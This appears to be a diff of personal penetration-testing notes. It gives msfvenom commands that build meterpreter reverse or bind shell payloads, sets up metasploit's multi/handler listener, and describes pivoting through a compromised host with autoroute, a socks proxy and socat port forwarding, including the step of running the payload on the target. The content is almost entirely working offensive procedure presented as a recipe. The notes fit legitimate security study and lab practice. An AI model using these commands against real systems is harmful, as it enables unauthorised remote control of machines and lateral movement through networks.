@@ -19,6 +19,7 @@ stty raw -echo; fg
 export TERM = xterm
 
 ----------metasploit reverse engineering---------------
+*** msfconsole
 1.create reverse file: msfvenom -p <payload, ex:linux/x64/meterpreter/reverse_tcp> LHOST=<your ip> -t <elf or exe> -o <name you want> LPORT=8080
 2.msfconsole; use exploit/multi/handler;
 3.set lhost, lport, payload and run
@@ -28,7 +29,14 @@ export TERM = xterm
 5.socks proxy: use auxiliary/server/socks_proxy; set srvport, srvhost, version and run
 (6. meterpreter: use post/multi/manage/shell_to_meterpreter; set session, payload and run)
 7.autoroute: use post/multi/manage/autoroute or run autoroute -s x.x.x.x/y, verify: run autoroute -p
-8. use proxychains or msfconsole methods
+8. target: run file on step 1 
+9. use proxychains or msfconsole on step 2
+
+*** socat port forwarding
+1. create reverse or bind file: msfvenom -p <payload, ex:windows/x64/meterpreter/reverse_tcp or bind_tcp> LHOST=<pivot ip or not needed> -t <elf or exe> -o <name> LPORT=8080
+2. pivot: socat TCP4-LISTEN:<listening port>,fork <target ip>:<target port>
+3. msfconsole; use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp or bind_tcp; lport, lhost or rhost set and run
+4. target: run file on step 1
 
 ----------metasploit port forwarding-----------
 in msfconsole
